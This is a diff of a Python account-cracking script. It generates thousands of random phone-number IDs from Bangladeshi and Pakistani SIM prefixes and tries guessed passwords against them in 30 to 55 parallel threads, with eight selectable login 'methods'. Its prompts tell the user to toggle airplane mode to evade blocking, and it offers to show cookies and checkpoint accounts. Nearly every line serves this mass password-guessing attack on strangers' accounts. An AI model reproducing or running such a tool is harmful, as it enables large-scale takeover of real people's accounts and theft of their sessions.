@@ -321,30 +321,52 @@ def SETINGX():
 
 #━━━━[ BANGLADESH RANDOM ]━━━━#
 def RANDOM():
-    user=[]
-    ck=[]
-    ____banner____()
-    code = input(f"{rad}[{white}◆{rad}] {green}SIM CODES {white} ▶︎ {rad}[{white}018 017 016 013{rad}]\n{rad}[{white}◆{rad}]{green} SELECTION  {white}▶︎ {yelloww}")
-    limit = int(input(f"{rad}[{white}◆{rad}] {green}EXAMPLE {white}   ▶︎ {rad}[{white}10000 20000 30000{rad}]\n{rad}[{white}◆{rad}] {green}LIMITS     {white}▶︎ {yelloww}"))
-    xmk = input(f"{rad}[{white}◆{rad}] {green}WANT TO SEE COOKIE {rad}[{green}Y{white}/{green}N{rad}] {white}▶︎ {yelloww}")
-    for _ in range(limit):
-        user.append("".join(random.choices(string.digits, k=8)))
-    if xmk == "Y" or xmk == "y":
-        ck.append("Y")
-    elif xmk == "N" or xmk == "n":
-        ck.append('N') 
-    else:
-        ck.append('N')
-    with tred(max_workers=35) as zar0Sefat:
-        ____banner____();tl = str(len(user))
-        print(f'{rad}[{white}◆{rad}] {green}SIM CODE{rad}┼{white}{code}{rad}┼{green}TOTAL IDS{rad}┼{white}{tl}')
-        print(f'{rad}[{white}◆{rad}] {green}IF NO RESULT [{white}On{orange}/{white}Off{green}] AIRPLANE MODE')
-        linex()
-        for love in user:
-            ids = code+love
-            passlist = [ids,love,ids[:8],ids[:7],code+code,love[1:],ids[:6],love[2:]]
-            zar0Sefat.submit(__API__,ids,passlist,tl,ck)
-    print("");linex();print(f"{rad}[{white}◆{rad}] {green}PROCESS HAS BEEN COMPLETED");print(f"{rad}[{white}◆{rad}] {green}TOTAL OK   {white}▶︎ {green}{len(oks)}");linex();exit()
+  user=[]
+  os.system('clear');____banner____();print(c7);print(led)
+  kode = input(f'{dot}SELECT CODE {M}: {H}');print(led);print(limitt);print(led)
+  limit = int(input(f'{dot}ENTER LIMIT {M}: {H}'));print(led)
+  xd_cp=input(f'{wt}SHOW CP ACCOUNT  {M}?{P} [{H}Y{P}/{K}N{P}] {M}:{H} ')
+  if xd_cp in ['y','Y','yes','Yes','1']:cp_xdx.append('y')
+  else:cp_xdx.append('n')
+ # print(led)
+  #cokixx=input(f'{wt}SHOW COOKIES  {M}?{P} [{H}Y{P}/{K}N{P}] {M}:{H} ')
+ #if cokixx in ['y','Y','yes','Yes','1']:cokix.append('y')
+  #else:cokix.append('n')
+  clear();____banner____();print(f"{dot}{P}SIM CODE  {RED}: {H}"+kode);print(led);print(f' {K}[{H}1{K}] {P}Method [{H}M1{P}]');print(f' {K}[{H}2{K}] {P}Method [{H}M2{P}]');print(f' {K}[{H}3{K}] {P}Method [{H}M3{P}]')
+  print(f' {K}[{H}4{K}] {P}Method [{H}M4{P}]');print(f' {K}[{H}5{K}] {P}Method [{H}M5{P}]');print(f' {K}[{H}6{K}] {P}Method [{H}M6{P}]');print(f' {K}[{H}7{K}] {P}Method [{H}M7{P}]');print(f' {K}[{H}8{K}] {P}Method [{H}M8{P}]');print(led)
+  hc = input(f'{wt}Select Method {M}:{H} ')
+  if hc in ['1','01']:mtd.append('m1')
+  elif hc in ['2','02']:mtd.append('m2')
+  elif hc in ['3','03']:mtd.append('m3')
+  elif hc in ['4','04']:mtd.append('m4')
+  elif hc in ['5','05']:mtd.append('m5')
+  elif hc in ['6','06']:mtd.append('m6')
+  elif hc in ['7','07']:mtd.append('m7')
+  elif hc in ['8','08']:mtd.append('m8')
+  else:
+      mtd.append('m1')
+  for nmbr in range(limit):
+    nmp = ''.join(random.choice(string.digits) for _ in range(6))
+    user.append(nmp)
+  with tred(max_workers=30) as king_xd:
+    os.system('clear')
+    tl = str(len(user))
+    ____banner____();print(f'{dot}METHOD{RED}      : {H}'+hc);print(f'{dot}SIM CODE{RED}    : {H}{kode}');print(f'{dot}TOTAL LIMIT{RED} : {H}{tl}');print(f'{dot}TURN ON/OFF AIRPLANE MODE {rong}✈{rong2}✈{rong3}✈{rong4}✈{rong5}✈{rong6}✈{rong7}✈' );print(led)
+    for guru in user:
+      ids = kode+guru
+      pwv = [ids[:6],ids[:8],ids,]
+      if 'm1' in mtd:king_xd.submit(m1,ids,pwv)
+      elif 'm2' in mtd:king_xd.submit(m2,ids,pwv)
+      elif 'm3' in mtd:king_xd.submit(m3,ids,pwv)
+      elif 'm4' in mtd:king_xd.submit(m4,ids,pwv)
+      elif 'm5' in mtd:king_xd.submit(m5,ids,pwv)
+      elif 'm6' in mtd:king_xd.submit(m6,ids,pwv)
+      elif 'm7' in mtd:king_xd.submit(m7,ids,pwv)
+      elif 'm8' in mtd:king_xd.submit(m8,ids,pwv)
+      else:
+       king_xd.submit(m5,ids,pwv)
+  print('');print(f'{N} Hi Dear User Crack process has been completed')
+  input(f'{dot}Press Enter To Go Menu');os.system('python zar0.py')
 #━━━━[ INDIAN RANDOM ]━━━━#
 def INDIA():
   user=[]
@@ -395,30 +417,52 @@ def INDIA():
   input(f'{dot}Press Enter To Go Menu');os.system('python zar0.py')
 #━━━━[ PAKISTAN RANDOM ]━━━━#
 def PAKISTAN():
-    user=[]
-    ck=[]
-    ____banner____()
-    code = input(f"{rad}[{white}◆{rad}] {green}SIM CODES {white} ▶︎ {rad}[{white}0310 0320 0330 0340{rad}]\n{rad}[{white}◆{rad}]{green} SELECTION  {white}▶︎ {yelloww}")
-    limit = int(input(f"{rad}[{white}◆{rad}] {green}EXAMPLE {white}   ▶︎ {rad}[{white}10000 20000 30000{rad}]\n{rad}[{white}◆{rad}] {green}LIMITS     {white}▶︎ {yelloww}"))
-    xmk = input(f"{rad}[{white}◆{rad}] {green}WANT TO SEE COOKIE {rad}[{green}Y{white}/{green}N{rad}] {white}▶︎ {yelloww}")
-    for _ in range(limit):
-        user.append("".join(random.choices(string.digits, k=7)))
-    if xmk == "Y" or xmk == "y":
-        ck.append("Y")
-    elif xmk == "N" or xmk == "n":
-        ck.append('N') 
-    else:
-        ck.append('N')
-    with tred(max_workers=55) as zar0Sefat:
-        ____banner____();tl = str(len(user))
-        print(f'{rad}[{white}◆{rad}] {green}SIM CODE{rad}┼{white}{code}{rad}┼{green}TOTAL IDS{rad}┼{white}{tl}')
-        print(f'{rad}[{white}◆{rad}] {green}IF NO RESULT [{white}On{orange}/{white}Off{green}] AIRPLANE MODE')
-        linex()
-        for love in user:
-            ids = code+love
-            au = love[:6];bu = ids[:8];passlist = [love,ids,au,bu, 'khankhan', 'khan khan', 'khan1234', 'khan12345', 'Pakistan', '203040']
-            zar0Sefat.submit(__API__,ids,passlist,tl,ck)
-    print("");linex();print(f"{rad}[{white}◆{rad}] {green}PROCESS HAS BEEN COMPLETED");print(f"{rad}[{white}◆{rad}] {green}TOTAL OK   {white}▶︎ {green}{len(oks)}");linex();exit()
+  user=[]
+  os.system('clear');____banner____();print(c7);print(led)
+  kode = input(f'{dot}SELECT CODE {M}: {H}');print(led);print(limitt);print(led)
+  limit = int(input(f'{dot}ENTER LIMIT {M}: {H}'));print(led)
+  xd_cp=input(f'{wt}SHOW CP ACCOUNT  {M}?{P} [{H}Y{P}/{K}N{P}] {M}:{H} ')
+  if xd_cp in ['y','Y','yes','Yes','1']:cp_xdx.append('y')
+  else:cp_xdx.append('n')
+ # print(led)
+  #cokixx=input(f'{wt}SHOW COOKIES  {M}?{P} [{H}Y{P}/{K}N{P}] {M}:{H} ')
+ #if cokixx in ['y','Y','yes','Yes','1']:cokix.append('y')
+  #else:cokix.append('n')
+  clear();____banner____();print(f"{dot}{P}SIM CODE  {RED}: {H}"+kode);print(led);print(f' {K}[{H}1{K}] {P}Method [{H}M1{P}]');print(f' {K}[{H}2{K}] {P}Method [{H}M2{P}]');print(f' {K}[{H}3{K}] {P}Method [{H}M3{P}]')
+  print(f' {K}[{H}4{K}] {P}Method [{H}M4{P}]');print(f' {K}[{H}5{K}] {P}Method [{H}M5{P}]');print(f' {K}[{H}6{K}] {P}Method [{H}M6{P}]');print(f' {K}[{H}7{K}] {P}Method [{H}M7{P}]');print(f' {K}[{H}8{K}] {P}Method [{H}M8{P}]');print(led)
+  hc = input(f'{wt}Select Method {M}:{H} ')
+  if hc in ['1','01']:mtd.append('m1')
+  elif hc in ['2','02']:mtd.append('m2')
+  elif hc in ['3','03']:mtd.append('m3')
+  elif hc in ['4','04']:mtd.append('m4')
+  elif hc in ['5','05']:mtd.append('m5')
+  elif hc in ['6','06']:mtd.append('m6')
+  elif hc in ['7','07']:mtd.append('m7')
+  elif hc in ['8','08']:mtd.append('m8')
+  else:
+      mtd.append('m1')
+  for nmbr in range(limit):
+    nmp = ''.join(random.choice(string.digits) for _ in range(6))
+    user.append(nmp)
+  with tred(max_workers=30) as king_xd:
+    os.system('clear')
+    tl = str(len(user))
+    ____banner____();print(f'{dot}METHOD{RED}      : {H}'+hc);print(f'{dot}SIM CODE{RED}    : {H}{kode}');print(f'{dot}TOTAL LIMIT{RED} : {H}{tl}');print(f'{dot}TURN ON/OFF AIRPLANE MODE {rong}✈{rong2}✈{rong3}✈{rong4}✈{rong5}✈{rong6}✈{rong7}✈' );print(led)
+    for guru in user:
+      ids = kode+guru
+      pwv = [ids[:6],ids[:8],ids,]
+      if 'm1' in mtd:king_xd.submit(m1,ids,pwv)
+      elif 'm2' in mtd:king_xd.submit(m2,ids,pwv)
+      elif 'm3' in mtd:king_xd.submit(m3,ids,pwv)
+      elif 'm4' in mtd:king_xd.submit(m4,ids,pwv)
+      elif 'm5' in mtd:king_xd.submit(m5,ids,pwv)
+      elif 'm6' in mtd:king_xd.submit(m6,ids,pwv)
+      elif 'm7' in mtd:king_xd.submit(m7,ids,pwv)
+      elif 'm8' in mtd:king_xd.submit(m8,ids,pwv)
+      else:
+       king_xd.submit(m5,ids,pwv)
+  print('');print(f'{N} Hi Dear User Crack process has been completed')
+  input(f'{dot}Press Enter To Go Menu');os.system('python zar0.py')
 #━━━━[ METHOD API ]━━━━#
 def m1(ids,pwv):
     global loop,oks,cps
